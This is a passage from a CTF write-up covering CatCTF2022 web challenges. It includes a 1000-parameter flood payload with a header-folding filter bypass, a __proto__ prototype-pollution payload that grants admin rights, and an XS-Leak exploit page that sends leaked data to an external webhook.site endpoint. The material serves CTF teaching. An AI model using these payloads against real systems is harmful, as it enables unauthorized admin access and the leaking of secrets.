class="line">&quot;634&quot;:&quot;1&quot;,</span><br><span class="line">&quot;635&quot;:&quot;1&quot;,</span><br><span class="line">&quot;636&quot;:&quot;1&quot;,</span><br><span class="line">&quot;637&quot;:&quot;1&quot;,</span><br><span class="line">&quot;638&quot;:&quot;1&quot;,</span><br><span class="line">&quot;639&quot;:&quot;1&quot;,</span><br><span class="line">&quot;640&quot;:&quot;1&quot;,</span><br><span class="line">&quot;641&quot;:&quot;1&quot;,</span><br><span class="line">&quot;642&quot;:&quot;1&quot;,</span><br><span class="line">&quot;643&quot;:&quot;1&quot;,</span><br><span class="line">&quot;644&quot;:&quot;1&quot;,</span><br><span class="line">&quot;645&quot;:&quot;1&quot;,</span><br><span class="line">&quot;646&quot;:&quot;1&quot;,</span><br><span class="line">&quot;647&quot;:&quot;1&quot;,</span><br><span class="line">&quot;648&quot;:&quot;1&quot;,</span><br><span class="line">&quot;649&quot;:&quot;1&quot;,</span><br><span class="line">&quot;650&quot;:&quot;1&quot;,</span><br><span class="line">&quot;651&quot;:&quot;1&quot;,</span><br><span class="line">&quot;652&quot;:&quot;1&quot;,</span><br><span class="line">&quot;653&quot;:&quot;1&quot;,</span><br><span class="line">&quot;654&quot;:&quot;1&quot;,</span><br><span class="line">&quot;655&quot;:&quot;1&quot;,</span><br><span class="line">&quot;656&quot;:&quot;1&quot;,</span><br><span class="line">&quot;657&quot;:&quot;1&quot;,</span><br><span class="line">&quot;658&quot;:&quot;1&quot;,</span><br><span class="line">&quot;659&quot;:&quot;1&quot;,</span><br><span class="line">&quot;660&quot;:&quot;1&quot;,</span><br><span class="line">&quot;661&quot;:&quot;1&quot;,</span><br><span class="line">&quot;662&quot;:&quot;1&quot;,</span><br><span class="line">&quot;663&quot;:&quot;1&quot;,</span><br><span class="line">&quot;664&quot;:&quot;1&quot;,</span><br><span class="line">&quot;665&quot;:&quot;1&quot;,</span><br><span class="line">&quot;666&quot;:&quot;1&quot;,</span><br><span class="line">&quot;667&quot;:&quot;1&quot;,</span><br><span class="line">&quot;668&quot;:&quot;1&quot;,</span><br><span class="line">&quot;669&quot;:&quot;1&quot;,</span><br><span class="line">&quot;670&quot;:&quot;1&quot;,</span><br><span class="line">&quot;671&quot;:&quot;1&quot;,</span><br><span class="line">&quot;672&quot;:&quot;1&quot;,</span><br><span class="line">&quot;673&quot;:&quot;1&quot;,</span><br><span class="line">&quot;674&quot;:&quot;1&quot;,</span><br><span class="line">&quot;675&quot;:&quot;1&quot;,</span><br><span class="line">&quot;676&quot;:&quot;1&quot;,</span><br><span class="line">&quot;677&quot;:&quot;1&quot;,</span><br><span class="line">&quot;678&quot;:&quot;1&quot;,</span><br><span class="line">&quot;679&quot;:&quot;1&quot;,</span><br><span class="line">&quot;680&quot;:&quot;1&quot;,</span><br><span class="line">&quot;681&quot;:&quot;1&quot;,</span><br><span class="line">&quot;682&quot;:&quot;1&quot;,</span><br><span class="line">&quot;683&quot;:&quot;1&quot;,</span><br><span class="line">&quot;684&quot;:&quot;1&quot;,</span><br><span class="line">&quot;685&quot;:&quot;1&quot;,</span><br><span class="line">&quot;686&quot;:&quot;1&quot;,</span><br><span class="line">&quot;687&quot;:&quot;1&quot;,</span><br><span class="line">&quot;688&quot;:&quot;1&quot;,</span><br><span class="line">&quot;689&quot;:&quot;1&quot;,</span><br><span class="line">&quot;690&quot;:&quot;1&quot;,</span><br><span class="line">&quot;691&quot;:&quot;1&quot;,</span><br><span class="line">&quot;692&quot;:&quot;1&quot;,</span><br><span class="line">&quot;693&quot;:&quot;1&quot;,</span><br><span class="line">&quot;694&quot;:&quot;1&quot;,</span><br><span class="line">&quot;695&quot;:&quot;1&quot;,</span><br><span class="line">&quot;696&quot;:&quot;1&quot;,</span><br><span class="line">&quot;697&quot;:&quot;1&quot;,</span><br><span class="line">&quot;698&quot;:&quot;1&quot;,</span><br><span class="line">&quot;699&quot;:&quot;1&quot;,</span><br><span class="line">&quot;700&quot;:&quot;1&quot;,</span><br><span class="line">&quot;701&quot;:&quot;1&quot;,</span><br><span class="line">&quot;702&quot;:&quot;1&quot;,</span><br><span class="line">&quot;703&quot;:&quot;1&quot;,</span><br><span class="line">&quot;704&quot;:&quot;1&quot;,</span><br><span class="line">&quot;705&quot;:&quot;1&quot;,</span><br><span class="line">&quot;706&quot;:&quot;1&quot;,</span><br><span class="line">&quot;707&quot;:&quot;1&quot;,</span><br><span class="line">&quot;708&quot;:&quot;1&quot;,</span><br><span class="line">&quot;709&quot;:&quot;1&quot;,</span><br><span class="line">&quot;710&quot;:&quot;1&quot;,</span><br><span class="line">&quot;711&quot;:&quot;1&quot;,</span><br><span class="line">&quot;712&quot;:&quot;1&quot;,</span><br><span class="line">&quot;713&quot;:&quot;1&quot;,</span><br><span class="line">&quot;714&quot;:&quot;1&quot;,</span><br><span class="line">&quot;715&quot;:&quot;1&quot;,</span><br><span class="line">&quot;716&quot;:&quot;1&quot;,</span><br><span class="line">&quot;717&quot;:&quot;1&quot;,</span><br><span class="line">&quot;718&quot;:&quot;1&quot;,</span><br><span class="line">&quot;719&quot;:&quot;1&quot;,</span><br><span class="line">&quot;720&quot;:&quot;1&quot;,</span><br><span class="line">&quot;721&quot;:&quot;1&quot;,</span><br><span class="line">&quot;722&quot;:&quot;1&quot;,</span><br><span class="line">&quot;723&quot;:&quot;1&quot;,</span><br><span class="line">&quot;724&quot;:&quot;1&quot;,</span><br><span class="line">&quot;725&quot;:&quot;1&quot;,</span><br><span class="line">&quot;726&quot;:&quot;1&quot;,</span><br><span class="line">&quot;727&quot;:&quot;1&quot;,</span><br><span class="line">&quot;728&quot;:&quot;1&quot;,</span><br><span class="line">&quot;729&quot;:&quot;1&quot;,</span><br><span class="line">&quot;730&quot;:&quot;1&quot;,</span><br><span class="line">&quot;731&quot;:&quot;1&quot;,</span><br><span class="line">&quot;732&quot;:&quot;1&quot;,</span><br><span class="line">&quot;733&quot;:&quot;1&quot;,</span><br><span class="line">&quot;734&quot;:&quot;1&quot;,</span><br><span class="line">&quot;735&quot;:&quot;1&quot;,</span><br><span class="line">&quot;736&quot;:&quot;1&quot;,</span><br><span class="line">&quot;737&quot;:&quot;1&quot;,</span><br><span class="line">&quot;738&quot;:&quot;1&quot;,</span><br><span class="line">&quot;739&quot;:&quot;1&quot;,</span><br><span class="line">&quot;740&quot;:&quot;1&quot;,</span><br><span class="line">&quot;741&quot;:&quot;1&quot;,</span><br><span class="line">&quot;742&quot;:&quot;1&quot;,</span><br><span class="line">&quot;743&quot;:&quot;1&quot;,</span><br><span class="line">&quot;744&quot;:&quot;1&quot;,</span><br><span class="line">&quot;745&quot;:&quot;1&quot;,</span><br><span class="line">&quot;746&quot;:&quot;1&quot;,</span><br><span class="line">&quot;747&quot;:&quot;1&quot;,</span><br><span class="line">&quot;748&quot;:&quot;1&quot;,</span><br><span class="line">&quot;749&quot;:&quot;1&quot;,</span><br><span class="line">&quot;750&quot;:&quot;1&quot;,</span><br><span class="line">&quot;751&quot;:&quot;1&quot;,</span><br><span class="line">&quot;752&quot;:&quot;1&quot;,</span><br><span class="line">&quot;753&quot;:&quot;1&quot;,</span><br><span class="line">&quot;754&quot;:&quot;1&quot;,</span><br><span class="line">&quot;755&quot;:&quot;1&quot;,</span><br><span class="line">&quot;756&quot;:&quot;1&quot;,</span><br><span class="line">&quot;757&quot;:&quot;1&quot;,</span><br><span class="line">&quot;758&quot;:&quot;1&quot;,</span><br><span class="line">&quot;759&quot;:&quot;1&quot;,</span><br><span class="line">&quot;760&quot;:&quot;1&quot;,</span><br><span class="line">&quot;761&quot;:&quot;1&quot;,</span><br><span class="line">&quot;762&quot;:&quot;1&quot;,</span><br><span class="line">&quot;763&quot;:&quot;1&quot;,</span><br><span class="line">&quot;764&quot;:&quot;1&quot;,</span><br><span class="line">&quot;765&quot;:&quot;1&quot;,</span><br><span class="line">&quot;766&quot;:&quot;1&quot;,</span><br><span class="line">&quot;767&quot;:&quot;1&quot;,</span><br><span class="line">&quot;768&quot;:&quot;1&quot;,</span><br><span class="line">&quot;769&quot;:&quot;1&quot;,</span><br><span class="line">&quot;770&quot;:&quot;1&quot;,</span><br><span class="line">&quot;771&quot;:&quot;1&quot;,</span><br><span class="line">&quot;772&quot;:&quot;1&quot;,</span><br><span class="line">&quot;773&quot;:&quot;1&quot;,</span><br><span class="line">&quot;774&quot;:&quot;1&quot;,</span><br><span class="line">&quot;775&quot;:&quot;1&quot;,</span><br><span class="line">&quot;776&quot;:&quot;1&quot;,</span><br><span class="line">&quot;777&quot;:&quot;1&quot;,</span><br><span class="line">&quot;778&quot;:&quot;1&quot;,</span><br><span class="line">&quot;779&quot;:&quot;1&quot;,</span><br><span class="line">&quot;780&quot;:&quot;1&quot;,</span><br><span class="line">&quot;781&quot;:&quot;1&quot;,</span><br><span class="line">&quot;782&quot;:&quot;1&quot;,</span><br><span class="line">&quot;783&quot;:&quot;1&quot;,</span><br><span class="line">&quot;784&quot;:&quot;1&quot;,</span><br><span class="line">&quot;785&quot;:&quot;1&quot;,</span><br><span class="line">&quot;786&quot;:&quot;1&quot;,</span><br><span class="line">&quot;787&quot;:&quot;1&quot;,</span><br><span class="line">&quot;788&quot;:&quot;1&quot;,</span><br><span class="line">&quot;789&quot;:&quot;1&quot;,</span><br><span class="line">&quot;790&quot;:&quot;1&quot;,</span><br><span class="line">&quot;791&quot;:&quot;1&quot;,</span><br><span class="line">&quot;792&quot;:&quot;1&quot;,</span><br><span class="line">&quot;793&quot;:&quot;1&quot;,</span><br><span class="line">&quot;794&quot;:&quot;1&quot;,</span><br><span class="line">&quot;795&quot;:&quot;1&quot;,</span><br><span class="line">&quot;796&quot;:&quot;1&quot;,</span><br><span class="line">&quot;797&quot;:&quot;1&quot;,</span><br><span class="line">&quot;798&quot;:&quot;1&quot;,</span><br><span class="line">&quot;799&quot;:&quot;1&quot;,</span><br><span class="line">&quot;800&quot;:&quot;1&quot;,</span><br><span class="line">&quot;801&quot;:&quot;1&quot;,</span><br><span class="line">&quot;802&quot;:&quot;1&quot;,</span><br><span class="line">&quot;803&quot;:&quot;1&quot;,</span><br><span class="line">&quot;804&quot;:&quot;1&quot;,</span><br><span class="line">&quot;805&quot;:&quot;1&quot;,</span><br><span class="line">&quot;806&quot;:&quot;1&quot;,</span><br><span class="line">&quot;807&quot;:&quot;1&quot;,</span><br><span class="line">&quot;808&quot;:&quot;1&quot;,</span><br><span class="line">&quot;809&quot;:&quot;1&quot;,</span><br><span class="line">&quot;810&quot;:&quot;1&quot;,</span><br><span class="line">&quot;811&quot;:&quot;1&quot;,</span><br><span class="line">&quot;812&quot;:&quot;1&quot;,</span><br><span class="line">&quot;813&quot;:&quot;1&quot;,</span><br><span class="line">&quot;814&quot;:&quot;1&quot;,</span><br><span class="line">&quot;815&quot;:&quot;1&quot;,</span><br><span class="line">&quot;816&quot;:&quot;1&quot;,</span><br><span class="line">&quot;817&quot;:&quot;1&quot;,</span><br><span class="line">&quot;818&quot;:&quot;1&quot;,</span><br><span class="line">&quot;819&quot;:&quot;1&quot;,</span><br><span class="line">&quot;820&quot;:&quot;1&quot;,</span><br><span class="line">&quot;821&quot;:&quot;1&quot;,</span><br><span class="line">&quot;822&quot;:&quot;1&quot;,</span><br><span class="line">&quot;823&quot;:&quot;1&quot;,</span><br><span class="line">&quot;824&quot;:&quot;1&quot;,</span><br><span class="line">&quot;825&quot;:&quot;1&quot;,</span><br><span class="line">&quot;826&quot;:&quot;1&quot;,</span><br><span class="line">&quot;827&quot;:&quot;1&quot;,</span><br><span class="line">&quot;828&quot;:&quot;1&quot;,</span><br><span class="line">&quot;829&quot;:&quot;1&quot;,</span><br><span class="line">&quot;830&quot;:&quot;1&quot;,</span><br><span class="line">&quot;831&quot;:&quot;1&quot;,</span><br><span class="line">&quot;832&quot;:&quot;1&quot;,</span><br><span class="line">&quot;833&quot;:&quot;1&quot;,</span><br><span class="line">&quot;834&quot;:&quot;1&quot;,</span><br><span class="line">&quot;835&quot;:&quot;1&quot;,</span><br><span class="line">&quot;836&quot;:&quot;1&quot;,</span><br><span class="line">&quot;837&quot;:&quot;1&quot;,</span><br><span class="line">&quot;838&quot;:&quot;1&quot;,</span><br><span class="line">&quot;839&quot;:&quot;1&quot;,</span><br><span class="line">&quot;840&quot;:&quot;1&quot;,</span><br><span class="line">&quot;841&quot;:&quot;1&quot;,</span><br><span class="line">&quot;842&quot;:&quot;1&quot;,</span><br><span class="line">&quot;843&quot;:&quot;1&quot;,</span><br><span class="line">&quot;844&quot;:&quot;1&quot;,</span><br><span class="line">&quot;845&quot;:&quot;1&quot;,</span><br><span class="line">&quot;846&quot;:&quot;1&quot;,</span><br><span class="line">&quot;847&quot;:&quot;1&quot;,</span><br><span class="line">&quot;848&quot;:&quot;1&quot;,</span><br><span class="line">&quot;849&quot;:&quot;1&quot;,</span><br><span class="line">&quot;850&quot;:&quot;1&quot;,</span><br><span class="line">&quot;851&quot;:&quot;1&quot;,</span><br><span class="line">&quot;852&quot;:&quot;1&quot;,</span><br><span class="line">&quot;853&quot;:&quot;1&quot;,</span><br><span class="line">&quot;854&quot;:&quot;1&quot;,</span><br><span class="line">&quot;855&quot;:&quot;1&quot;,</span><br><span class="line">&quot;856&quot;:&quot;1&quot;,</span><br><span class="line">&quot;857&quot;:&quot;1&quot;,</span><br><span class="line">&quot;858&quot;:&quot;1&quot;,</span><br><span class="line">&quot;859&quot;:&quot;1&quot;,</span><br><span class="line">&quot;860&quot;:&quot;1&quot;,</span><br><span class="line">&quot;861&quot;:&quot;1&quot;,</span><br><span class="line">&quot;862&quot;:&quot;1&quot;,</span><br><span class="line">&quot;863&quot;:&quot;1&quot;,</span><br><span class="line">&quot;864&quot;:&quot;1&quot;,</span><br><span class="line">&quot;865&quot;:&quot;1&quot;,</span><br><span class="line">&quot;866&quot;:&quot;1&quot;,</span><br><span class="line">&quot;867&quot;:&quot;1&quot;,</span><br><span class="line">&quot;868&quot;:&quot;1&quot;,</span><br><span class="line">&quot;869&quot;:&quot;1&quot;,</span><br><span class="line">&quot;870&quot;:&quot;1&quot;,</span><br><span class="line">&quot;871&quot;:&quot;1&quot;,</span><br><span class="line">&quot;872&quot;:&quot;1&quot;,</span><br><span class="line">&quot;873&quot;:&quot;1&quot;,</span><br><span class="line">&quot;874&quot;:&quot;1&quot;,</span><br><span class="line">&quot;875&quot;:&quot;1&quot;,</span><br><span class="line">&quot;876&quot;:&quot;1&quot;,</span><br><span class="line">&quot;877&quot;:&quot;1&quot;,</span><br><span class="line">&quot;878&quot;:&quot;1&quot;,</span><br><span class="line">&quot;879&quot;:&quot;1&quot;,</span><br><span class="line">&quot;880&quot;:&quot;1&quot;,</span><br><span class="line">&quot;881&quot;:&quot;1&quot;,</span><br><span class="line">&quot;882&quot;:&quot;1&quot;,</span><br><span class="line">&quot;883&quot;:&quot;1&quot;,</span><br><span class="line">&quot;884&quot;:&quot;1&quot;,</span><br><span class="line">&quot;885&quot;:&quot;1&quot;,</span><br><span class="line">&quot;886&quot;:&quot;1&quot;,</span><br><span class="line">&quot;887&quot;:&quot;1&quot;,</span><br><span class="line">&quot;888&quot;:&quot;1&quot;,</span><br><span class="line">&quot;889&quot;:&quot;1&quot;,</span><br><span class="line">&quot;890&quot;:&quot;1&quot;,</span><br><span class="line">&quot;891&quot;:&quot;1&quot;,</span><br><span class="line">&quot;892&quot;:&quot;1&quot;,</span><br><span class="line">&quot;893&quot;:&quot;1&quot;,</span><br><span class="line">&quot;894&quot;:&quot;1&quot;,</span><br><span class="line">&quot;895&quot;:&quot;1&quot;,</span><br><span class="line">&quot;896&quot;:&quot;1&quot;,</span><br><span class="line">&quot;897&quot;:&quot;1&quot;,</span><br><span class="line">&quot;898&quot;:&quot;1&quot;,</span><br><span class="line">&quot;899&quot;:&quot;1&quot;,</span><br><span class="line">&quot;900&quot;:&quot;1&quot;,</span><br><span class="line">&quot;901&quot;:&quot;1&quot;,</span><br><span class="line">&quot;902&quot;:&quot;1&quot;,</span><br><span class="line">&quot;903&quot;:&quot;1&quot;,</span><br><span class="line">&quot;904&quot;:&quot;1&quot;,</span><br><span class="line">&quot;905&quot;:&quot;1&quot;,</span><br><span class="line">&quot;906&quot;:&quot;1&quot;,</span><br><span class="line">&quot;907&quot;:&quot;1&quot;,</span><br><span class="line">&quot;908&quot;:&quot;1&quot;,</span><br><span class="line">&quot;909&quot;:&quot;1&quot;,</span><br><span class="line">&quot;910&quot;:&quot;1&quot;,</span><br><span class="line">&quot;911&quot;:&quot;1&quot;,</span><br><span class="line">&quot;912&quot;:&quot;1&quot;,</span><br><span class="line">&quot;913&quot;:&quot;1&quot;,</span><br><span class="line">&quot;914&quot;:&quot;1&quot;,</span><br><span class="line">&quot;915&quot;:&quot;1&quot;,</span><br><span class="line">&quot;916&quot;:&quot;1&quot;,</span><br><span class="line">&quot;917&quot;:&quot;1&quot;,</span><br><span class="line">&quot;918&quot;:&quot;1&quot;,</span><br><span class="line">&quot;919&quot;:&quot;1&quot;,</span><br><span class="line">&quot;920&quot;:&quot;1&quot;,</span><br><span class="line">&quot;921&quot;:&quot;1&quot;,</span><br><span class="line">&quot;922&quot;:&quot;1&quot;,</span><br><span class="line">&quot;923&quot;:&quot;1&quot;,</span><br><span class="line">&quot;924&quot;:&quot;1&quot;,</span><br><span class="line">&quot;925&quot;:&quot;1&quot;,</span><br><span class="line">&quot;926&quot;:&quot;1&quot;,</span><br><span class="line">&quot;927&quot;:&quot;1&quot;,</span><br><span class="line">&quot;928&quot;:&quot;1&quot;,</span><br><span class="line">&quot;929&quot;:&quot;1&quot;,</span><br><span class="line">&quot;930&quot;:&quot;1&quot;,</span><br><span class="line">&quot;931&quot;:&quot;1&quot;,</span><br><span class="line">&quot;932&quot;:&quot;1&quot;,</span><br><span class="line">&quot;933&quot;:&quot;1&quot;,</span><br><span class="line">&quot;934&quot;:&quot;1&quot;,</span><br><span class="line">&quot;935&quot;:&quot;1&quot;,</span><br><span class="line">&quot;936&quot;:&quot;1&quot;,</span><br><span class="line">&quot;937&quot;:&quot;1&quot;,</span><br><span class="line">&quot;938&quot;:&quot;1&quot;,</span><br><span class="line">&quot;939&quot;:&quot;1&quot;,</span><br><span class="line">&quot;940&quot;:&quot;1&quot;,</span><br><span class="line">&quot;941&quot;:&quot;1&quot;,</span><br><span class="line">&quot;942&quot;:&quot;1&quot;,</span><br><span class="line">&quot;943&quot;:&quot;1&quot;,</span><br><span class="line">&quot;944&quot;:&quot;1&quot;,</span><br><span class="line">&quot;945&quot;:&quot;1&quot;,</span><br><span class="line">&quot;946&quot;:&quot;1&quot;,</span><br><span class="line">&quot;947&quot;:&quot;1&quot;,</span><br><span class="line">&quot;948&quot;:&quot;1&quot;,</span><br><span class="line">&quot;949&quot;:&quot;1&quot;,</span><br><span class="line">&quot;950&quot;:&quot;1&quot;,</span><br><span class="line">&quot;951&quot;:&quot;1&quot;,</span><br><span class="line">&quot;952&quot;:&quot;1&quot;,</span><br><span class="line">&quot;953&quot;:&quot;1&quot;,</span><br><span class="line">&quot;954&quot;:&quot;1&quot;,</span><br><span class="line">&quot;955&quot;:&quot;1&quot;,</span><br><span class="line">&quot;956&quot;:&quot;1&quot;,</span><br><span class="line">&quot;957&quot;:&quot;1&quot;,</span><br><span class="line">&quot;958&quot;:&quot;1&quot;,</span><br><span class="line">&quot;959&quot;:&quot;1&quot;,</span><br><span class="line">&quot;960&quot;:&quot;1&quot;,</span><br><span class="line">&quot;961&quot;:&quot;1&quot;,</span><br><span class="line">&quot;962&quot;:&quot;1&quot;,</span><br><span class="line">&quot;963&quot;:&quot;1&quot;,</span><br><span class="line">&quot;964&quot;:&quot;1&quot;,</span><br><span class="line">&quot;965&quot;:&quot;1&quot;,</span><br><span class="line">&quot;966&quot;:&quot;1&quot;,</span><br><span class="line">&quot;967&quot;:&quot;1&quot;,</span><br><span class="line">&quot;968&quot;:&quot;1&quot;,</span><br><span class="line">&quot;969&quot;:&quot;1&quot;,</span><br><span class="line">&quot;970&quot;:&quot;1&quot;,</span><br><span class="line">&quot;971&quot;:&quot;1&quot;,</span><br><span class="line">&quot;972&quot;:&quot;1&quot;,</span><br><span class="line">&quot;973&quot;:&quot;1&quot;,</span><br><span class="line">&quot;974&quot;:&quot;1&quot;,</span><br><span class="line">&quot;975&quot;:&quot;1&quot;,</span><br><span class="line">&quot;976&quot;:&quot;1&quot;,</span><br><span class="line">&quot;977&quot;:&quot;1&quot;,</span><br><span class="line">&quot;978&quot;:&quot;1&quot;,</span><br><span class="line">&quot;979&quot;:&quot;1&quot;,</span><br><span class="line">&quot;980&quot;:&quot;1&quot;,</span><br><span class="line">&quot;981&quot;:&quot;1&quot;,</span><br><span class="line">&quot;982&quot;:&quot;1&quot;,</span><br><span class="line">&quot;983&quot;:&quot;1&quot;,</span><br><span class="line">&quot;984&quot;:&quot;1&quot;,</span><br><span class="line">&quot;985&quot;:&quot;1&quot;,</span><br><span class="line">&quot;986&quot;:&quot;1&quot;,</span><br><span class="line">&quot;987&quot;:&quot;1&quot;,</span><br><span class="line">&quot;988&quot;:&quot;1&quot;,</span><br><span class="line">&quot;989&quot;:&quot;1&quot;,</span><br><span class="line">&quot;990&quot;:&quot;1&quot;,</span><br><span class="line">&quot;991&quot;:&quot;1&quot;,</span><br><span class="line">&quot;992&quot;:&quot;1&quot;,</span><br><span class="line">&quot;993&quot;:&quot;1&quot;,</span><br><span class="line">&quot;994&quot;:&quot;1&quot;,</span><br><span class="line">&quot;995&quot;:&quot;1&quot;,</span><br><span class="line">&quot;996&quot;:&quot;1&quot;,</span><br><span class="line">&quot;997&quot;:&quot;1&quot;,</span><br><span class="line">&quot;998&quot;:&quot;1&quot;,</span><br><span class="line">&quot;999&quot;:&quot;1&quot;,</span><br><span class="line">&quot;1000&quot;:&quot;1&quot;</span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure>

<img src="/2023/01/01/Nepnep-CatCTF2022/ez_curl_Flag_P5SbhJxx3h.png" class="">

<p>两个trick</p>
<p><a target="_blank" rel="noopener" href="https://github.com/ljharb/qs/blob/7e937fafdf67330d54547bbd34909f1f0c11ed72/lib/parse.js" title="https://github.com/ljharb/qs/blob/7e937fafdf67330d54547bbd34909f1f0c11ed72/lib/parse.js">https://github.com/ljharb/qs/blob/7e937fafdf67330d54547bbd34909f1f0c11ed72/lib/parse.js</a></p>
<p>express的parameterLimit默认为1000，传1000个参数PHP中的admin&#x3D;false会被忽略。</p>
<p><a target="_blank" rel="noopener" href="https://www.w3.org/Protocols/rfc2616/rfc2616-sec4.html#sec4.2" title="https://www.w3.org/Protocols/rfc2616/rfc2616-sec4.html#sec4.2">https://www.w3.org/Protocols/rfc2616/rfc2616-sec4.html#sec4.2</a></p>
<p>根据rfc，header字段可以通过在每一行前面至少加一个SP或HT来扩展到多行。以此绕过对headers的过滤。</p>
<h3 id="wife💃"><a href="#wife💃" class="headerlink" title="wife💃"></a>wife💃</h3><p>简单的原型链污染，然后蹭了一下原神的热度。题目逻辑很简单，要邀请码才能注册为admin，普通用户只能拿到wife，没有flag。</p>
<p>当时题目是黑盒的条件，师傅们可以通过 fuzz 得到有用的信息，因为在后面题目还是 0 解的情况下我们放出了 hint：后端某处采用了 Object.assign()</p>
<p>这里我们放出源码：看一下注册的逻辑</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/register&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> user = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(req.<span class="property">body</span>)</span><br><span class="line">    <span class="keyword">if</span> (!user.<span class="property">username</span> || !user.<span class="property">password</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">msg</span>: <span class="string">&#x27;empty username or password&#x27;</span>, <span class="attr">err</span>: <span class="literal">true</span> &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (users.<span class="title function_">filter</span>(<span class="function"><span class="params">u</span> =&gt;</span> u.<span class="property">username</span> == user.<span class="property">username</span>).<span class="property">length</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">msg</span>: <span class="string">&#x27;username already exists&#x27;</span>, <span class="attr">err</span>: <span class="literal">true</span> &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (user.<span class="property">isAdmin</span> &amp;&amp; user.<span class="property">inviteCode</span> != <span class="variable constant_">INVITE_CODE</span>) &#123;</span><br><span class="line">        user.<span class="property">isAdmin</span> = <span class="literal">false</span></span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">msg</span>: <span class="string">&#x27;invalid invite code&#x27;</span>, <span class="attr">err</span>: <span class="literal">true</span> &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> newUser = <span class="title class_">Object</span>.<span class="title function_">assign</span>(&#123;&#125;, baseUser, user)</span><br><span class="line">    users.<span class="title function_">push</span>(newUser)</span><br><span class="line">    res.<span class="title function_">json</span>(&#123; <span class="attr">msg</span>: <span class="string">&#x27;user created successfully&#x27;</span>, <span class="attr">err</span>: <span class="literal">false</span> &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>稍微搜一下 Object.assign 可以发现这个方法是可以触发原型链污染的，然后污染 <code>__proto__.isAdmin</code> 为 true 就可以了。</p>
<p>贴一个payload</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;isAdmin&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>不过admin虽然可以拿到flag，但是没有wife。：）</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/cat_wife_Flag_2NNIQrqGO2.png" class="">

<h3 id="web-challenge💪"><a href="#web-challenge💪" class="headerlink" title="web_challenge💪"></a>web_challenge💪</h3><p>先注册并登录，是一道 XSS 打 Leak</p>
<p>漏洞点</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/sharePoiint_Y65bxu5YbT.png" class="">

<p>exp.html 如下</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    let text = new URLSearchParams(location.search).get(&#x27;text&#x27;)</span><br><span class="line">    let w = window.open(&#x27;http://localhost:5000/find?text=&#x27; + text)</span><br><span class="line">    setTimeout(() =&gt; &#123;</span><br><span class="line">        w.location = &#x27;about:blank&#x27;</span><br><span class="line">        setTimeout(() =&gt; &#123;</span><br><span class="line">            console.log(w.history.length)</span><br><span class="line">            const webhook = &#x27;https://webhook.site/c171b240-3c3f-4121-91f3-a4f3a6987e35&#x27;</span><br><span class="line">            fetch(webhook, &#123;method:&#x27;POST&#x27;, body:w.history.length&#125;)</span><br><span class="line">        &#125;, 1000)</span><br><span class="line">    &#125;, 2000)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>webhook：<a target="_blank" rel="noopener" href="https://webhook.site/" title="https://webhook.site/">https://webhook.site/</a></p>
<p>正确回显是 2，错误回显是 3，发送请求 ，这是错误的，回显为 3</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://IP:port/exp.html?text=catctf&#123;t1</span><br></pre></td></tr></table></figure>

<img src="/2023/01/01/Nepnep-CatCTF2022/pastebin3_YAAh6ES4hR.png" class="">

<p>正确的回显为 2</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://IP:port/exp.html?text=catctf&#123;tes</span><br></pre></td></tr></table></figure>

<img src="/2023/01/01/Nepnep-CatCTF2022/pastebin2_GOpi0mTtAn.png" class="">

<p>本题的脚本若是用 python 写是无法实现的，需要用 js 或 ts 来编写，有兴趣可以联系 LemonPerfect 师傅(QQ:1476136743)</p>
<h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="DDH-Game"><a href="#DDH-Game" class="headerlink" title="DDH_Game"></a>DDH_Game</h3><p>图片来自 <a target="_blank" rel="noopener" href="https://toc.cryptobook.us/" title="A Graduate Course in Applied Cryptography(Version 0.5)">A Graduate Course in Applied Cryptography(Version 0.5)</a></p>
<img src="/2023/01/01/Nepnep-CatCTF2022/DDH_gOaCb9oWJA.png" class="">

<p>这道题显然是让我们求解椭圆曲线上的DDH问题(ECDDHP)。</p>
<h4 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h4><p>由于题目中的BLS曲线是配对友好曲线，所以可以计算双线性对。</p>
<p>双线性对满足 $e(aG, bG) &#x3D; e(G, abG)$</p>
